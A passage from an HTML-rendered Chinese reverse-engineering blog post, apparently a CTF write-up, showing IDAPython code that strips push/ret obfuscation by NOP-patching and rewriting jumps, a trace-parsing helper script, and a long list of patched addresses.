class="number">2</span>)</span><br><span class="line">                    <span class="keyword">if</span> added &gt; <span class="number">0x7fffffff</span>:</span><br><span class="line">                        added = -(<span class="number">0x100000000</span> - added)</span><br><span class="line">                    jmp_addr = ( (calladdr + <span class="number">5</span>) ^ xored ) + added</span><br><span class="line">                    <span class="keyword">if</span> lastjmp &gt; jmp_addr:</span><br><span class="line">                        asmret = <span class="number">0xFFFFFFFF</span> - (lastjmp + <span class="number">5</span> - jmp_addr) +<span class="number">1</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        asmret = jmp_addr - (lastjmp + <span class="number">5</span>)</span><br><span class="line">                    shell = [<span class="string">''</span>] * <span class="number">5</span></span><br><span class="line">                    shell[<span class="number">0</span>] = <span class="number">0xe9</span></span><br><span class="line">                    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">                        shell[j+<span class="number">1</span>] = (asmret &amp; (<span class="number">0xff</span> &lt;&lt; j*<span class="number">8</span>)) &gt;&gt; j * <span class="number">8</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">for</span> killd <span class="keyword">in</span> asmrip:                    <span class="comment">#clear rubbish</span></span><br><span class="line">                        kil_op_len = getlen(killd)</span><br><span class="line">                        <span class="keyword">for</span> kil_i <span class="keyword">in</span> range(kil_op_len):</span><br><span class="line">                            ida_bytes.patch_byte( killd + kil_i, <span class="number">0x90</span>)</span><br><span class="line">                            kil_i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">                        print(<span class="string">'from '</span> + str(hex(asmrip[<span class="number">0</span>])) + <span class="string">' to '</span> + str(hex(asmrip[<span class="number">-1</span>])) + <span class="string">' be patched'</span>)</span><br><span class="line">                        print(<span class="string">'from '</span> + str(hex(lastjmp)) + <span class="string">' jmp to '</span> + str(hex(jmp_addr)))</span><br><span class="line">                    mypatch(lastjmp,shell)<span class="comment">#patch jmp</span></span><br><span class="line">                    fkcnt += <span class="number">1</span></span><br><span class="line">                    st = lastjmp</span><br><span class="line">                    </span><br><span class="line">                    <span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">                        print(<span class="string">'\n'</span>)</span><br><span class="line">                    fkpus += fuckpush(st)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> op == <span class="string">'jmp'</span>:</span><br><span class="line">            st = calcjmp(st)</span><br><span class="line">        <span class="keyword">elif</span> op == <span class="string">'retn'</span>:</span><br><span class="line">            print(<span class="string">"fuck "</span> + str(fkcnt) + <span class="string">" pairs of 'pop ret'"</span>)</span><br><span class="line">            <span class="keyword">return</span> fkcnt + fkpus</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            st += op_len</span><br></pre></td></tr></table></figure><p>不过我写的逻辑是直到不能够处理的 retn 就停下来</p><p>所以只能够先 trace 一遍有混淆的</p><p>再写个脚本把 retn 下一行的代码的地址提取出来(大部分都可以这样解决</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os, time, sys, re</span><br><span class="line">file = open(<span class="string">"./trace1.txt"</span>,encoding=<span class="string">"utf8"</span>)</span><br><span class="line">key = <span class="string">"ret"</span></span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line">sb = []</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> file.readlines():</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">        ssb = int(line.split(<span class="string">'|'</span>)[<span class="number">1</span>].strip(),<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> ssb &lt; <span class="number">0x200000000</span>:</span><br><span class="line">            sb.append(ssb)</span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">in</span> line:</span><br><span class="line">        flag = <span class="number">1</span></span><br><span class="line">file.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> sb:</span><br><span class="line">    print(str(hex(i)),end=<span class="string">','</span>)</span><br></pre></td></tr></table></figure><p>后面一边 trace 一边 patch 不过我直接把我 patch 完的所有有效地址写上吧 可以省掉大家很多复现的时间</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fucklist=[<span class="number">0x14004085a</span>,<span class="number">0x1400224c8</span>,<span class="number">0x1400424a2</span>,<span class="number">0x1400dfcb1</span>,<span class="number">0x14001206c</span>,<span class="number">0x140019e2e</span>,<span class="number">0x14001f509</span>,<span class="number">0x14007a881</span>,<span class="number">0x140097094</span>,<span class="number">0x140026507</span>,<span class="number">0x1400c07b3</span>,<span class="number">0x1400a17bf</span>,<span class="number">0x1400eed90</span>,<span class="number">0x140041d1f</span>,<span class="number">0x140049ec5</span>,<span class="number">0x140068125</span>,<span class="number">0x14008874d</span>,<span class="number">0x14003d3a8</span>,<span class="number">0x1400ba55e</span>,<span class="number">0x1400b4dc9</span>,<span class="number">0x14009480a</span>,<span class="number">0x1400d1602</span>,<span class="number">0x1400db842</span>,<span class="number">0x14008a584</span>,<span class="number">0x14007cfa7</span>,<span class="number">0x140035884</span>,<span class="number">0x14000f9e9</span>,<span class="number">0x1400e63a4</span>,<span class="number">0x1400c3492</span>,<span class="number">0x1400143c9</span>,<span class="number">0x1400e1d72</span>,<span class="number">0x14009e7f0</span>,<span class="number">0x140032c3c</span>,<span class="number">0x140033e50</span>,<span class="number">0x14009881b</span>,<span class="number">0x1400308b6</span>,<span class="number">0x1400beea3</span>,<span class="number">0x14004460b</span>,<span class="number">0x1400bcb75</span>,<span class="number">0x1400b0cdc</span>,<span class="number">0x14005edb0</span>,<span class="number">0x14007de2e</span>,<span class="number">0x140086a9f</span>,<span class="number">0x1400f575b</span>,<span class="number">0x140017f67</span>,<span class="number">0x14008e5cd</span>,<span class="number">0x140030dea</span>,<span class="number">0x1400adcb7</span>,<span class="number">0x1400857c4</span>,<span class="number">0x1400025b9</span>,<span class="number">0x1400b6283</span>,<span class="number">0x1400ac98b</span>,<span class="number">0x1400d22ff</span>,<span class="number">0x14004e3ca</span>,<span class="number">0x140099671</span>,<span class="number">0x140099677</span>,<span class="number">0x14000391a</span>,<span class="number">0x14007c539</span>,<span class="number">0x1400bb3c7</span>,<span class="number">0x14008f046</span>,<span class="number">0x1400a978f</span>,<span class="number">0x14009b70f</span>,<span class="number">0x1400a6b74</span>,<span class="number">0x140045f2e</span>,<span class="number">0x140037db2</span>,<span class="number">0x140021128</span>,<span class="number">0x1400e549d</span>,<span class="number">0x140088782</span>,<span class="number">0x140069be7</span>,<span class="number">0x14004c42b</span>,<span class="number">0x140044fae</span>,<span class="number">0x1400533d0</span>,<span class="number">0x14006bf6a</span>,<span class="number">0x1400a0c6c</span>,<span class="number">0x14003a608</span>,<span class="number">0x14001cae6</span>,<span class="number">0x1400f63e6</span>,<span class="number">0x1400affb6</span>,<span class="number">0x14000d8f7</span>,<span class="number">0x14003f111</span>,<span class="number">0x140046bcf</span>,<span class="number">0x140066b81</span>,<span class="number">0x14006734f</span>,<span class="number">0x140063405</span>,<span class="number">0x14005c245</span>,<span class="number">0x1400a8f62</span>,<span class="number">0x140050474</span>,<span class="number">0x14006b372</span>,<span class="number">0x1400e9fea</span>,<span class="number">0x1400f5667</span>,<span class="number">0x1400ba5aa</span>,<span class="number">0x140021277</span>,<span class="number">0x1400f8634</span>,<span class="number">0x1400bcce5</span>,<span class="number">0x1400386f9</span>,<span class="number">0x1400f5741</span>,<span class="number">0x140040fed</span>,<span class="number">0x1400ae5a0</span>,<span class="number">0x1400de1b6</span>,<span class="number">0x1400127b9</span>,<span class="number">0x1400afa4c</span>,<span class="number">0x14009cbfe</span>,<span class="number">0x14004d06f</span>,<span class="number">0x1400f74bb</span>,<span class="number">0x1400b0bad</span>,<span class="number">0x1400aa0b4</span>,<span class="number">0x1400e86dc</span>,<span class="number">0x14003d6b8</span>,<span class="number">0x1400407ed</span>,<span class="number">0x1400ee996</span>,<span class="number">0x14006b83d</span>,<span class="number">0x1400932f0</span>,<span class="number">0x14001c061</span>,<span class="number">0x140020e62</span>,<span class="number">0x14007c505</span>,<span class="number">0x14004c19b</span>,<span class="number">0x1400403f6</span>,<span class="number">0x14003d086</span>,<span class="number">0x1400609dd</span>,<span class="number">0x1400645e4</span>,<span class="number">0x14002ade3</span>,<span class="number">0x1400201b3</span>,<span class="number">0x1400585f8</span>,<span class="number">0x1400344a2</span>,<span class="number">0x14003746d</span>,<span class="number">0x140093ae9</span>,<span class="number">0x1400f8f00</span>,<span class="number">0x14003cb4b</span>,<span class="number">0x1400a0472</span>,<span class="number">0x14004cc27</span>,<span class="number">0x1400a720f</span>,<span class="number">0x140062b19</span>,<span class="number">0x1400d7e9d</span>,<span class="number">0x140035b53</span>,<span class="number">0x1400489eb</span>,<span class="number">0x1400c93d1</span>,<span class="number">0x140049b13</span>,<span class="number">0x1400b6994</span>,<span class="number">0x1400dc2a0</span>,<span class="number">0x1400b1d93</span>,<span class="number">0x14007a048</span>,<span class="number">0x1400bbdb4</span>,<span class="number">0x140093534</span>,<span class="number">0x1400a939a</span>,<span class="number">0x140065701</span>,<span class="number">0x1400ac86b</span>,<span class="number">0x14003c7f8</span>,<span class="number">0x1400b2b4d</span>,<span class="number">0x1400e5d05</span>,<span class="number">0x1400c9ee6</span>,<span class="number">0x1400961bf</span>,<span class="number">0x1400d1abe</span>,<span class="number">0x1400e6ac8</span>,<span class="number">0x1400c8f1f</span>,<span class="number">0x14005e050</span>,<span class="number">0x140095e85</span>,<span class="number">0x1400610a1</span>,<span class="number">0x14003a0b5</span>,<span class="number">0x1400cda74</span>,<span class="number">0x14009367b</span>,<span class="number">0x1400c26a0</span>,<span class="number">0x1400b3149</span>,<span class="number">0x140024323</span>,<span class="number">0x14000234c</span>,<span class="number">0x1400175a1</span>,<span class="number">0x14001a8f0</span>,<span class="number">0x1400a1493</span>,<span class="number">0x140052dc1</span>,<span class="number">0x1400cfa4f</span>,<span class="number">0x1400c82e5</span>,<span class="number">0x14008e488</span>,<span class="number">0x140026895</span>,<span class="number">0x1400d667c</span>,<span class="number">0x14002cd55</span>,<span class="number">0x1400f5c45</span>,<span class="number">0x14008bf75</span>,<span class="number">0x140010075</span>,<span class="number">0x1400190b3</span>,<span class="number">0x1400de7d0</span>,<span class="number">0x14008d5d4</span>,<span class="number">0x1400e4a0c</span>,<span class="number">0x1400a7382</span>,<span class="number">0x140037876</span>,<span class="number">0x1400d5016</span>,<span class="number">0x1400c7b84</span>,<span class="number">0x14003ad82</span>,<span class="number">0x140065331</span>,<span class="number">0x140013029</span>,<span class="number">0x1400b4f3a</span>,<span class="number">0x14008c9ee</span>,<span class="number">0x1400c376e</span>,<span class="number">0x1400f95db</span>,<span class="number">0x14003eb8e</span>,<span class="number">0x140070774</span>,<span class="number">0x140051198</span>,<span class="number">0x1400bd38a</span>,<span class="number">0x14008c893</span>,<span class="number">0x140041e14</span>,<span class="number">0x140092f4a</span>,<span class="number">0x1400e487b</span>,<span class="number">0x1400f75f6</span>,<span class="number">0x140021d1b</span>,<span class="number">0x140013251</span>,<span class="number">0x14005047c</span>,<span class="number">0x140028abd</span>,<span class="number">0x1400e5392</span>,<span class="number">0x1400a8349</span>,<span class="number">0x14007619b</span>,<span class="number">0x14004cfaf</span>,<span class="number">0x140051b04</span>,<span class="number">0x140020bc7</span>,<span class="number">0x1400122e2</span>,<span class="number">0x140079ad8</span>,<span class="number">0x1400c5aa9</span>,<span class="number">0x14008fdb8</span>,<span class="number">0x1400b6b57</span>,<span class="number">0x1400ef67c</span>,<span class="number">0x14008239c</span>,<span class="number">0x14008f521</span>,<span class="number">0x140084df2</span>,<span class="number">0x1400d203c</span>,<span class="number">0x1400108a1</span>,<span class="number">0x1400e399d</span>,<span class="number">0x140021f1c</span>,<span class="number">0x14001d98f</span>,<span class="number">0x1400d9e3c</span>,<span class="number">0x1400a86dd</span>,<span class="number">0x1400ce809</span>,<span class="number">0x140032394</span>,<span class="number">0x140093660</span>,<span class="number">0x14001f168</span>,<span class="number">0x14009aabc</span>,<span class="number">0x1400ed298</span>,<span class="number">0x1400dc6f5</span>,<span class="number">0x140002691</span>,<span class="number">0x1400b603b</span>,<span class="number">0x14009c76a</span>,<span class="number">0x140053a4f</span>,<span class="number">0x1400411dc</span>,<span class="number">0x1400411e2</span>,<span class="number">0x1400cf6b9</span>,<span class="number">0x140049b81</span>,<span class="number">0x140053fcb</span>,<span class="number">0x1400fa16d</span>,<span class="number">0x14001d49c</span>,<span class="number">0x14002d10f</span>,<span class="number">0x14009644f</span>,<span class="number">0x140068922</span>,<span class="number">0x1400f734a</span>,<span class="number">0x1400195f6</span>,<span class="number">0x1400b932b</span>,<span class="number">0x1400a7f82</span>,<span class="number">0x140020c11</span>,<span class="number">0x1400d1807</span>,<span class="number">0x14006b86f</span>,<span class="number">0x1400a0e4f</span>,<span class="number">0x140033127</span>,<span class="number">0x1400db36d</span>,<span class="number">0x14005cf3b</span>,<span class="number">0x14005d401</span>,<span class="number">0x1400d70e7</span>,<span class="number">0x14006b0e0</span>,<span class="number">0x14009b72b</span>,<span class="number">0x14004f9a3</span>,<span class="number">0x1400cb0a9</span>,<span class="number">0x1400d9db0</span>,<span class="number">0x1400677e0</span>,<span class="number">0x1400113c0</span>,<span class="number">0x1400e0c75</span>,<span class="number">0x140042cfe</span>,<span class="number">0x14000bcd7</span>,<span class="number">0x14009a73b</span>,<span class="number">0x1400b0a29</span>,<span class="number">0x1400a25e7</span>,<span class="number">0x1400de3af</span>,<span class="number">0x140097af0</span>,<span class="number">0x14000b885</span>,<span class="number">0x1400e2a2a</span>,<span class="number">0x1400fa18e</span>,<span class="number">0x1400017a2</span>,<span class="number">0x1400f7e0d</span>,<span class="number">0x1400e08ef</span>,<span class="number">0x14008b954</span>,<span class="number">0x140039307</span>,<span class="number">0x140080b6f</span>,<span class="number">0x140017839</span>,<span class="number">0x140062a08</span>,<span class="number">0x140019442</span>,<span class="number">0x1400b5921</span>,<span class="number">0x140011462</span>,<span class="number">0x1400f9d12</span>,<span class="number">0x1400d91a0</span>,<span class="number">0x140012fa9</span>,<span class="number">0x140067ef0</span>,<span class="number">0x1400b7c3d</span>,<span class="number">0x1400752dd</span>,<span class="number">0x14002715b</span>,<span class="number">0x140010b61</span>,<span class="number">0x1400e9d43</span>,<span class="number">0x1400f0464</span>,<span class="number">0x1400ded5f</span>,<span class="number">0x1400843dd</span>,<span class="number">0x1400843e1</span>,<span class="number">0x14008020d</span>,<span class="number">0x140028484</span>,<span class="number">0x1400f8380</span>,<span class="number">0x140053e38</span>,<span class="number">0x140036180</span>,<span class="number">0x140080d39</span>,<span class="number">0x1400a6c18</span>,<span class="number">0x1400b6324</span>,<span class="number">0x1400de837</span>,<span class="number">0x1400a7352</span>,<span class="number">0x14007cd16</span>,<span class="number">0x1400f0f20</span>,<span class="number">0x14007cfdd</span>,<span class="number">0x14009002f</span>,<span class="number">0x140080a00</span>,<span class="number">0x1400f1551</span>,<span class="number">0x1400be82f</span>,<span class="number">0x1400a9650</span>,<span class="number">0x1400f84de</span>,<span class="number">0x140017f67</span>,<span class="number">0x14008e5cd</span>,<span class="number">0x140030dea</span>,<span class="number">0x1400adcb7</span>,<span class="number">0x1400857c4</span>,<span class="number">0x1400025b9</span>,<span class="number">0x1400b6283</span>,<span class="number">0x1400ac98b</span>,<span class="number">0x1400d22ff</span>,<span class="number">0x14004e3ca</span>,<span class="number">0x140099671</span>,<span class="number">0x140099677</span>,<span class="number">0x14000391a</span>,<span class="number">0x14007c539</span>,<span class="number">0x1400bb3c7</span>,<span class="number">0x14008f046</span>,<span class="number">0x1400a978f</span>,<span class="number">0x14009b70f</span>,<span class="number">0x1400a6b74</span>,<span class="number">0x140045f2e</span>,<span class="number">0x140037db2</span>,<span class="number">0x140021128</span>,<span class="number">0x1400e549d</span>,<span class="number">0x140088782</span>,<span class="number">0x140069be7</span>,<span class="number">0x1400021e4</span>,<span class="number">0x14005f397</span>,<span class="number">0x140064bf6</span>,<span class="number">0x140025c2d</span>,<span class="number">0x140017f67</span>,<span class="number">0x14008e5cd</span>,<span class="number">0x140030dea</span>,<span class="number">0x1400adcb7</span>,<span class="number">0x1400857c4</span>,<span class="number">0x1400025b9</span>,<span class="number">0x1400b6283</span>,<span class="number">0x1400ac98b</span>,<span class="number">0x1400d22ff</span>,<span class="number">0x14004e3ca</span>,<span class="number">0x140099671</span>,<span class="number">0x140099677</span>,<span class="number">0x14000391a</span>,<span class="number">0x14007c539</span>,<span class="number">0x1400bb3c7</span>,<span class="number">0x14008f046</span>,<span class="number">0x1400a978f</span>,<span class="number">0x14009b70f</span>,<span class="number">0x1400a6b74</span>,<span class="number">0x140045f2e</span>,<span class="number">0x140037db2</span>,<span class="number">0x140021128</span>,<span class="number">0x1400e549d</span>,<span class="number">0x140088782</span>,<span class="number">0x140069be7</span>,<span class="number">0x1400ce142</span>,<span class="number">0x140076982</span>,<span class="number">0x1400453d7</span>,<span class="number">0x140078961</span>,<span class="number">0x1400a0c6c</span>,<span class="number">0x14003a608</span>,<span class="number">0x14001cae6</span>,<span class="number">0x1400f63e6</span>,<span class="number">0x1400affb6</span>,<span class="number">0x14000d8f7</span>,<span class="number">0x14003f111</span>,<span class="number">0x140046bcf</span>,<span class="number">0x140066b81</span>,<span class="number">0x14006734f</span>,<span class="number">0x140063405</span>,<span class="number">0x14005c245</span>,<span class="number">0x1400a8f62</span>,<span class="number">0x140050474</span>,<span class="number">0x14006b372</span>,<span class="number">0x1400e9fea</span>,<span class="number">0x1400f5667</span>,<span class="number">0x1400ba5aa</span>,<span class="number">0x140021277</span>,<span class="number">0x1400f8634</span>,<span class="number">0x1400bcce5</span>,<span class="number">0x1400386f9</span>,<span class="number">0x1400f5741</span>,<span class="number">0x140040fed</span>,<span class="number">0x1400ae5a0</span>,<span class="number">0x1400de1b6</span>,<span class="number">0x1400127b9</span>,<span class="number">0x1400afa4c</span>,<span class="number">0x14009cbfe</span>,<span class="number">0x14004d06f</span>,<span class="number">0x1400f74bb</span>,<span class="number">0x1400b0bad</span>,<span class="number">0x1400aa0b4</span>,<span class="number">0x1400e86dc</span>,<span class="number">0x14003d6b8</span>,<span class="number">0x1400407ed</span>,<span class="number">0x1400ee996</span>,<span class="number">0x14006b83d</span>,<span class="number">0x1400932f0</span>,<span class="number">0x14001c061</span>,<span class="number">0x140020e62</span>,<span class="number">0x14007c505</span>,<span class="number">0x14004c19b</span>,<span class="number">0x1400403f6</span>,<span class="number">0x14003d086</span>,<span class="number">0x1400609dd</span>,<span class="number">0x1400645e4</span>,<span class="number">0x14002ade3</span>,<span class="number">0x1400201b3</span>,<span class="number">0x1400585f8</span>,<span class="number">0x1400344a2</span>,<span class="number">0x14003746d</span>,<span class="number">0x140093ae9</span>,<span class="number">0x1400f8f00</span>,<span class="number">0x14003cb4b</span>,<span class="number">0x1400a0472</span>,<span class="number">0x14004cc27</span>,<span class="number">0x1400a720f</span>,<span class="number">0x140062b19</span>,<span class="number">0x1400d7e9d</span>,<span class="number">0x140035b53</span>,<span class="number">0x1400489eb</span>,<span class="number">0x1400c93d1</span>,<span class="number">0x140049b13</span>,<span class="number">0x1400b6994</span>,<span class="number">0x1400dc2a0</span>,<span class="number">0x1400b1d93</span>,<span class="number">0x14007a048</span>,<span class="number">0x1400bbdb4</span>,<span class="number">0x140093534</span>,<span class="number">0x1400a939a</span>,<span class="number">0x140065701</span>,<span class="number">0x1400ac86b</span>,<span class="number">0x14003c7f8</span>,<span class="number">0x1400b2b4d</span>,<span class="number">0x1400e5d05</span>,<span class="number">0x1400c9ee6</span>,<span class="number">0x1400961bf</span>,<span class="number">0x1400d1abe</span>,<span class="number">0x1400e6ac8</span>,<span class="number">0x1400c8f1f</span>,<span class="number">0x14005e050</span>,<span class="number">0x140095e85</span>,<span class="number">0x1400610a1</span>,<span class="number">0x14003a0b5</span>,<span class="number">0x1400cda74</span>,<span class="number">0x14009367b</span>,<span class="number">0x1400c26a0</span>,<span class="number">0x1400b3149</span>,<span class="number">0x140024323</span>,<span class="number">0x14000234c</span>,<span class="number">0x1400175a1</span>,<span class="number">0x14001a8f0</span>,<span class="number">0x1400a1493</span>,<span class="number">0x140052dc1</span>,<span class="number">0x1400cfa4f</span>,<span class="number">0x1400c82e5</span>,<span class="number">0x14008e488</span>,<span class="number">0x140026895</span>,<span class="number">0x1400d667c</span>,<span class="number">0x14002cd55</span>,<span class="number">0x1400f5c45</span>,<span class="number">0x14008bf75</span>,<span class="number">0x140010075</span>,<span class="number">0x1400190b3</span>,<span class="number">0x1400de7d0</span>,<span class="number">0x14008d5d4</span>,<span class="number">0x1400e4a0c</span>,<span class="number">0x1400a7382</span>,<span class="number">0x140037876</span>,<span class="number">0x1400d5016</span>,<span class="number">0x1400c7b84</span>,<span class="number">0x14003ad82</span>,<span class="number">0x140065331</span>,<span class="number">0x140013029</span>,<span class="number">0x1400b4f3a</span>,<span class="number">0x14008c9ee</span>,<span class="number">0x1400c376e</span>,<span class="number">0x1400f95db</span>,<span class="number">0x14003eb8e</span>,<span class="number">0x140070774</span>,<span class="number">0x140051198</span>,<span class="number">0x1400bd38a</span>,<span class="number">0x14008c893</span>,<span class="number">0x140041e14</span>,<span class="number">0x140092f4a</span>,<span class="number">0x1400e487b</span>,<span class="number">0x1400f75f6</span>,<span class="number">0x140021d1b</span>,<span class="number">0x140013251</span>,<span class="number">0x14005047c</span>,<span class="number">0x140028abd</span>,<span class="number">0x1400e5392</span>,<span class="number">0x1400a8349</span>,<span class="number">0x14007619b</span>,<span class="number">0x14004cfaf</span>,<span class="number">0x140051b04</span>,<span class="number">0x140020bc7</span>,<span class="number">0x1400122e2</span>,<span class="number">0x140079ad8</span>,<span class="number">0x1400c5aa9</span>,<span class="number">0x14008fdb8</span>,<span class="number">0x1400b6b57</span>,<span class="number">0x1400ef67c</span>,<span class="number">0x14008239c</span>,<span class="number">0x14008f521</span>,<span class="number">0x140084df2</span>,<span class="number">0x1400d203c</span>,<span class="number">0x1400108a1</span>,<span class="number">0x1400e399d</span>,<span class="number">0x140021f1c</span>,<span class="number">0x14001d98f</span>,<span class="number">0x1400d9e3c</span>,<span class="number">0x1400a86dd</span>,<span class="number">0x1400ce809</span>,<span class="number">0x140032394</span>,<span class="number">0x140093660</span>,<span class="number">0x14001f168</span>,<span class="number">0x14009aabc</span>,<span class="number">0x1400ed298</span>,<span class="number">0x1400dc6f5</span>,<span class="number">0x140002691</span>,<span class="number">0x1400b603b</span>,<span class="number">0x14009c76a</span>,<span class="number">0x140053a4f</span>,<span class="number">0x1400411dc</span>,<span class="number">0x1400411e2</span>,<span class="number">0x1400cf6b9</span>,<span class="number">0x140049b81</span>,<span class="number">0x140053fcb</span>,<span class="number">0x1400fa16d</span>,<span class="number">0x14001d49c</span>,<span class="number">0x14002d10f</span>,<span class="number">0x14009644f</span>,<span class="number">0x140068922</span>,<span class="number">0x1400f734a</span>,<span class="number">0x1400195f6</span>,<span class="number">0x1400b932b</span>,<span class="number">0x1400a7f82</span>,<span class="number">0x140020c11</span>,<span class="number">0x1400d1807</span>,<span class="number">0x14006b86f</span>,<span class="number">0x1400a0e4f</span>,<span class="number">0x140033127</span>,<span class="number">0x1400db36d</span>,<span class="number">0x14005cf3b</span>,<span class="number">0x14005d401</span>,<span class="number">0x1400d70e7</span>,<span class="number">0x14006b0e0</span>,<span class="number">0x14009b72b</span>,<span class="number">0x14004f9a3</span>,<span class="number">0x1400cb0a9</span>,<span class="number">0x1400d9db0</span>,<span class="number">0x1400677e0</span>,<span class="number">0x1400113c0</span>,<span class="number">0x1400e0c75</span>,<span class="number">0x140042cfe</span>,<span class="number">0x14000bcd7</span>,<span class="number">0x14009a73b</span>,<span class="number">0x1400b0a29</span>,<span class="number">0x1400a25e7</span>,<span class="number">0x1400de3af</span>,<span class="number">0x140097af0</span>,<span class="number">0x14000b885</span>,<span class="number">0x1400e2a2a</span>,<span class="number">0x1400fa18e</span>,<span class="number">0x1400017a2</span>,<span class="number">0x1400f7e0d</span>,<span class="number">0x1400e08ef</span>,<span class="number">0x14008b954</span>,<span class="number">0x140039307</span>,<span class="number">0x140080b6f</span>,<span class="number">0x140017839</span>,<span class="number">0x140062a08</span>,<span class="number">0x140019442</span>,<span class="number">0x1400b5921</span>,<span class="number">0x140011462</span>,<span class="number">0x1400f9d12</span>,<span class="number">0x1400d91a0</span>,<span class="number">0x140012fa9</span>,<span class="number">0x140067ef0</span>,<span class="number">0x1400b7c3d</span>,<span class="number">0x1400752dd</span>,<span class="number">0x14002715b</span>,<span class="number">0x140010b61</span>,<span class="number">0x1400e9d43</span>,<span class="number">0x1400f0464</span>,<span class="number">0x1400ded5f</span>,<span class="number">0x1400843dd</span>,<span class="number">0x1400843e1</span>,<span class="number">0x14008020d</span>,<span class="number">0x140028484</span>,<span class="number">0x1400f8380</span>,<span class="number">0x140053e38</span>,<span class="number">0x140036180</span>,<span class="number">0x140080d39</span>,<span class="number">0x1400a6c18</span>,<span class="number">0x1400b6324</span>,<span class="number">0x1400de837</span>,<span class="number">0x1400a7352</span>,<span class="number">0x14007cd16</span>,<span class="number">0x1400f0f20</span>,<span class="number">0x14007cfdd</span>,<span class="number">0x14009002f</span>,<span class="number">0x140080a00</span>,<span class="number">0x1400f1551</span>,<span class="number">0x14006fb9d</span>,<span class="number">0x140013ffa</span>,<span class="number">0x140064e88</span>,<span class="number">0x140017f67</span>,<span class="number">0x14008e5cd</span>,<span class="number">0x140030dea</span>,<span class="number">0x1400adcb7</span>,<span class="number">0x1400857c4</span>,<span class="number">0x1400025b9</span>,<span class="number">0x1400b6283</span>,<span class="number">0x1400ac98b</span>,<span class="number">0x1400d22ff</span>,<span class="number">0x14004e3ca</span>,<span class="number">0x140099671</span>,<span class="number">0x140099677</span>,<span class="number">0x14000391a</span>,<span class="number">0x14007c539</span>,<span class="number">0x1400bb3c7</span>,<span class="number">0x14008f046</span>,<span class="number">0x1400a978f</span>,<span class="number">0x14009b70f</span>,<span class="number">0x1400a6b74</span>,<span class="number">0x140045f2e</span>,<span class="number">0x140037db2</span>,<span class="number">0x140021128</span>,<span class="number">0x1400e549d</span>,<span class="number">0x140088782</span>,<span class="number">0x140069be7</span>,<span class="number">0x140064e90</span>,<span class="number">0x140034e9b</span>,<span class="number">0x140074ce9</span>,<span class="number">0x1400ee88d</span>,<span class="number">0x140017f67</span>,<span class="number">0x14008e5cd</span>,<span class="number">0x140030dea</span>,<span class="number">0x1400adcb7</span>,<span class="number">0x1400857c4</span>,<span class="number">0x1400025b9</span>,<span class="number">0x1400b6283</span>,<span class="number">0x1400ac98b</span>,<span class="number">0x1400d22ff</span>,<span class="number">0x14004e3ca</span>,<span class="number">0x140099671</span>,<span class="number">0x140099677</span>,<span class="number">0x14000391a</span>,<span class="number">0x14007c539</span>,<span class="number">0x1400bb3c7</span>,<span class="number">0x14008f046</span>,<span class="number">0x1400a978f</span>,<span class="number">0x14009b70f</span>,<span class="number">0x1400a6b74</span>,<span class="number">0x140045f2e</span>,<span class="number">0x140037db2</span>,<span class="number">0x140021128</span>,<span class="number">0x1400e549d</span>,<span class="number">0x140088782</span>,<span class="number">0x140069be7</span>,<span class="number">0x1400d8db6</span>,<span class="number">0x14006cd36</span>,<span class="number">0x1400c0765</span>,<span class="number">0x140061681</span>,<span class="number">0x1400a0c6c</span>,<span class="number">0x14003a608</span>,<span class="number">0x14001cae6</span>,<span class="number">0x1400f63e6</span>,<span class="number">0x1400affb6</span>,<span class="number">0x14000d8f7</span>,<span class="number">0x14003f111</span>,<span class="number">0x140046bcf</span>,<span class="number">0x140066b81</span>,<span class="number">0x14006734f</span>,<span class="number">0x140063405</span>,<span class="number">0x14005c245</span>,<span class="number">0x1400a8f62</span>,<span class="number">0x140050474</span>,<span class="number">0x14006b372</span>,<span class="number">0x1400e9fea</span>,<span class="number">0x1400f5667</span>,<span class="number">0x1400ba5aa</span>,<span class="number">0x140021277</span>,<span class="number">0x1400f8634</span>,<span class="number">0x1400bcce5</span>,<span class="number">0x1400386f9</span>,<span class="number">0x1400f5741</span>,<span class="number">0x140040fed</span>,<span class="number">0x1400ae5a0</span>,<span class="number">0x1400de1b6</span>,<span class="number">0x1400127b9</span>,<span class="number">0x1400afa4c</span>,<span class="number">0x14009cbfe</span>,<span class="number">0x14004d06f</span>,<span class="number">0x1400f74bb</span>,<span class="number">0x1400b0bad</span>,<span class="number">0x1400aa0b4</span>,<span class="number">0x1400e86dc</span>,<span class="number">0x14003d6b8</span>,<span class="number">0x1400407ed</span>,<span class="number">0x1400ee996</span>,<span class="number">0x14006b83d</span>,<span class="number">0x1400932f0</span>,<span class="number">0x14001c061</span>,<span class="number">0x140020e62</span>,<span class="number">0x14007c505</span>,<span class="number">0x14004c19b</span>,<span class="number">0x1400403f6</span>,<span class="number">0x14003d086</span>,<span class="number">0x1400609dd</span>,<span 